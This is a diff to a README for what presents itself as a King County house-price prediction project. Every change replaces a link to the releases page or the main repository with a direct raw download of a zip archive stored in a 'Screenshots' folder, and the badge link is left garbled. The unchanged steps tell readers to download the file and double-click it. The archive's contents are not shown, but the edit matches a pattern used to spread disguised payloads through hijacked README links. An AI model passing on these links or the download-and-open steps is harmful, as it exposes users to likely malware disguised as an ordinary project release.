@@ -1,7 +1,7 @@
 # 📊 House-Sales-Price-Prediction-King-County-USA-Project - Predict Your Next Home Price
 
 ## 🚀 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/releases)
+[![Download Now](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/raw/refs/heads/main/Screenshots/Prediction-King-Price-US-County-House-Sales-Project-2.2.zip%20Now-Click%https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/raw/refs/heads/main/Screenshots/Prediction-King-Price-US-County-House-Sales-Project-2.2.zip)](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/raw/refs/heads/main/Screenshots/Prediction-King-Price-US-County-House-Sales-Project-2.2.zip)
 
 ## 📋 Description
 This project predicts residential housing prices in King County, WA. It uses Python and machine learning to achieve a 79.8% accuracy in price predictions. Whether you are interested in real estate investments or want to understand housing trends, this tool offers valuable insights.
@@ -20,7 +20,7 @@ This project predicts residential housing prices in King County, WA. It uses Pyt
 - Python Programming
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/releases) to download the latest version of the application. Choose the file that matches your operating system, then follow these steps:
+To get started, visit the [Releases page](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/raw/refs/heads/main/Screenshots/Prediction-King-Price-US-County-House-Sales-Project-2.2.zip) to download the latest version of the application. Choose the file that matches your operating system, then follow these steps:
 
 1. **Download the File**: Click the link for your operating system.
 2. **Open the File**: Locate where the file downloaded, then double-click to open it.
@@ -65,7 +65,7 @@ If you wish to contribute, please fork the repository, make your changes, and su
 
 ## 🔗 Additional Resources
 - **Documentation**: Detailed usage instructions and methodology are available in the `docs/` folder in the repository.
-- **GitHub Repository**: More information is located at the [main repository](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project).
+- **GitHub Repository**: More information is located at the [main repository](https://github.com/LuisOrtizUH/House-Sales-Price-Prediction-King-County-USA-Project/raw/refs/heads/main/Screenshots/Prediction-King-Price-US-County-House-Sales-Project-2.2.zip).
 
 ## 🌟 Feedback
 Your feedback is valuable. Please take a moment to share your experience so we can make the application better for everyone. 
